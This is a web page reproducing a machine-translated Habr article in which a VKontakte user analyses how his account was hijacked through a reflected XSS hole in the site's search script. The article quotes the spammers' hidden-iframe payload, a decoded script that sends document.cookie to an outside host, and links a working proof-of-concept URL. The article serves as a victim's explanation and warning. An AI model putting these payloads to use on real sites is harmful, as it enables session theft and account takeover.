<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>XSS VKontakte</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Background (can not read) 
 I come home today and see 9 messages in my VKontakte. Because I don‚Äôt really like and often visit this resource - this eve...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>XSS VKontakte</h1><div class="post__text post__text-html js-mediator-article"><h4>  <b>Background</b> (can not read) </h4><br>  I come home today and see 9 messages in my VKontakte.  Because  I don‚Äôt really like and often visit this resource - this event was strange.  In the messages, users wrote that from me VKontakte sent spam.  Bad, but oh well, I changed the password and that's it ... Though I thought about it: the old password is 12 character alphanumeric, it‚Äôs almost not salvage.  The computer is crystal clear and not contagious ... So what's the deal? <a name="habracut"></a><br><br><h4>  <b>Debriefing</b> </h4><br>  I watch the text of the message sent on my behalf: <br><blockquote>  hello, it's not spam!  I am referring to all my friends. Today, I will remove my page and I will be able to turn my words to the <a href="http://odnonochniki/%3Ftk/">page</a> . , I am under my own surname and name.wot so. </blockquote>  And here I understand that my natural curiosity has let me down this time too.  Yesterday, a similar message came to me, and of course, sitting on the opera, feeling safe and secure, I followed this link.  Now go to this page ( <b>from an unlocked browser!</b> ), And look at the code.  What do we see?  A hidden floating frame is loaded in the code: <pre>  &lt;iframe src = 'http: //%76%6b%6f%6e%74%61%6b%74%65%2e%72%75/gsearch.php? q =% 27; () ()) // \% 27; document.write (String.fromCharCode (60,115,99,114,105,112, there were still many digits separated by commas that stretched the page and for that the UFO took them. If anyone really needs them - in a personal)) //% 22;% 3C% 3E% 22) // \% 22;% 3C% 3E% 22% 3C% 3E% 22% 22! ---% 22?% 3E # c [q] =% 27% 3B () ()) % 20% 20 \ &amp; c [section] = people 'style =' display: none; '&gt; &lt;/ iframe&gt; </pre>  The link leads to the ‚Äúlencode‚Äù for ‚Äúvkontakte.ru‚Äù, to the script that performs the search.  As you know, after the search procedure, the text of the request is displayed back to the user, this (as well as the lack of proper filtering) and the spammers used in this case. <br>  The JavaScript code is embedded in the query string, in this case, it is the code of another frame encoded into ASCII: <pre>  &lt;script&gt; document.write ('&lt;iframe src = "http://webzer.vov.ru/s.php?dc='+document.cookie+'" style = "display: none;"&gt; &lt;/ iframe&gt; ' ); &lt;/ script&gt; </pre>  This is actually a sniffer, to which some interesting users like me fly to vkontakte. <br>  Vulnerability is relevant at the time of writing, a simple alert (tested under the opera) <a href="http://vkontakte.ru/gsearch.php%3Fq%3D%2527%3B()())//%255C%2527%3Bdocument.write(String.fromCharCode(60,105,102,114,97,109,101,32,115,116,121,108,101,61,100,105,115,112,108,97,121,58,110,111,110,101,59,32,115,114,99,61,100,97,116,97,58,116,101,120,116,47,104,116,109,108,59,98,97,115,101,54,52,44,80,72,78,106,99,109,108,119,100,68,53,104,98,71,86,121,100,67,103,51,78,122,99,112,79,122,119,118,99,50,78,121,97,88,66,48,80,103,61,61,62,60,47,105,102,114,97,109,101,62))//%2522%3B%253C%253E%2522)//%255C%2522%3B%253C%253E%2522%253C%253E%2522%2522!---%2522%3F%253E">demonstrates this</a> .  In IE, it does not work, because  there is no support for the "data:" protocol, and I am not an expert in writing exploits. <br><br><h4>  <b>Some conclusions</b> </h4><br><ul><li>  Do not walk on the left links. </li><li>  A secure browser does not guarantee anything (in this case, it is an XSS vulnerability on the ‚Äúlargest website of the runet‚Äù), but vigilance puts an </li></ul><br>  <b>UPD: The</b> alert example stopped working after 3.5 hours after publication.  For those who did not have time to see a <a href="">screenshot</a> preserved. </div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/62283/">https://habr.com/ru/post/62283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../62276/index.html">Crowd wisdom and social networks</a></li>
<li><a href="../62277/index.html">Microsoft Small Basic 0.5 has been released</a></li>
<li><a href="../62279/index.html">What is a browser?</a></li>
<li><a href="../62280/index.html">How to draw design applications for the iPhone?</a></li>
<li><a href="../62282/index.html">‚ÄúYes, we ate our ears!‚Äù - a little gorilla marketing</a></li>
<li><a href="../62286/index.html">Nigma again pumped the query input line</a></li>
<li><a href="../62287/index.html">How does the ranking</a></li>
<li><a href="../62291/index.html">Twitter is an opposition weapon</a></li>
<li><a href="../62292/index.html">"BagHanter Professional"</a></li>
<li><a href="../62293/index.html">Commercial Spaceport</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>